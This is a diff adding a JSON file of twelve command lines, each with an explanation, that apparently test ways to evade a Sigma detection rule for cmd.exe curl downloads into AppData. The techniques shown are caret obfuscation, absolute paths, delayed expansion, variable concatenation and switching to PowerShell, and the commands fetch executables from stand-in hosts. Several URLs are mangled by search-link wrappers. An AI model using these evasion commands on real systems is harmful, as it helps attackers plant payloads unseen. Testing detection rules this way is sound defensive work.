@@ -1,0 +1,50 @@
+[
+  {
+    "output": "cmd.exe /c curl -o %USERPROFILE%\\AppData\\Roaming\\test.exe [http://example.com/test.exe](https://www.google.com/search?q=http://example.com/test.exe)",
+    "explanation": "Bypasses the rule by using the explicit path to the AppData directory (%USERPROFILE%\\AppData\\Roaming) instead of the %AppData% environment variable, circumventing the '%AppData%' string match condition."
+  },
+  {
+    "output": "cmd.exe /c \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
+    "explanation": "Bypasses the rule by inserting CMD caret (^) escape characters into the target strings. The command interpreter ignores these characters during execution, but static SIEM string checks for 'http' and '%AppData%' will fail."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri '[http://example.com/test.exe](https://www.google.com/search?q=http://example.com/test.exe)' -OutFile $env:APPDATA\\test.exe\"",
+    "explanation": "Bypasses the rule by using powershell.exe instead of cmd.exe to perform the download, as the Sigma rule's selection strictly looks for the process Image ending with '\\cmd.exe'."
+  },
+  {
+    "output": "cmd.exe /c \"curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\\file.exe\"",
+    "explanation": "Bypasses the CommandLine string matching by using caret (^) obfuscation on 'http' and '%AppData%'. The Windows command processor ignores the carets during execution, but literal string detection rules will fail to match."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\\payload.exe\"",
+    "explanation": "Bypasses the rule entirely because the rule's Image condition specifically looks for '\\cmd.exe'. Executing the download directly via PowerShell evades this initial filter."
+  },
+  {
+    "output": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\\AppData\\Roaming\\file.exe&& call curl %protocol%%url% -o %dest%\"",
+    "explanation": "Bypasses the specific string checks by using environment variable concatenation and by specifying the absolute path to the Roaming AppData folder instead of using the monitored '%AppData%' variable."
+  },
+  {
+    "output": "cmd.exe /c \"curl [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) -o %USERPROFILE%\\AppData\\Roaming\\payload.exe\"",
+    "explanation": "The rule explicitly looks for the literal string '%AppData%'. By using '%USERPROFILE%\\AppData\\Roaming', the command resolves to the exact same directory while completely evading the '%AppData%' string match condition."
+  },
+  {
+    "output": "cmd.exe /c \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\\payload.exe\"",
+    "explanation": "The Windows command shell interprets the caret symbol (^) as an escape character. The raw process creation logs will capture the command line containing the carets, breaking the contiguous 'http' and '://' substring matches required by the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri '[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)' -OutFile \\\"$env:APPDATA\\payload.exe\\\"\"",
+    "explanation": "The detection logic is strictly bound to the execution of '\\cmd.exe' in the Image condition. By performing the download and file drop directly using PowerShell without a cmd.exe wrapper, the Image condition is bypassed entirely."
+  },
+  {
+    "output": "cmd.exe /V:ON /c \"curl [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) -o !AppData!\\payload.exe\"",
+    "explanation": "By launching cmd.exe with delayed environment variable expansion enabled (/V:ON), the attacker can reference the AppData path using exclamation marks ('!AppData!') instead of percent signs, bypassing the explicit '%AppData%' string match."
+  },
+  {
+    "output": "cmd.exe /c \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
+    "explanation": "Bypasses the rule by using the absolute path to the AppData directory rather than the literal environment variable string '%AppData%', evading the specific 'contains' string match."
+  },
+  {
+    "output": "cmd.exe /c \"set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\\%A%%D%\\Roaming\\test.txt\"",
+    "explanation": "Bypasses the rule by using caret escaping on 'http' (h^ttp) and manually concatenating environment variables to build the AppData string, breaking the 'contains|all' logic."
+  }
+]
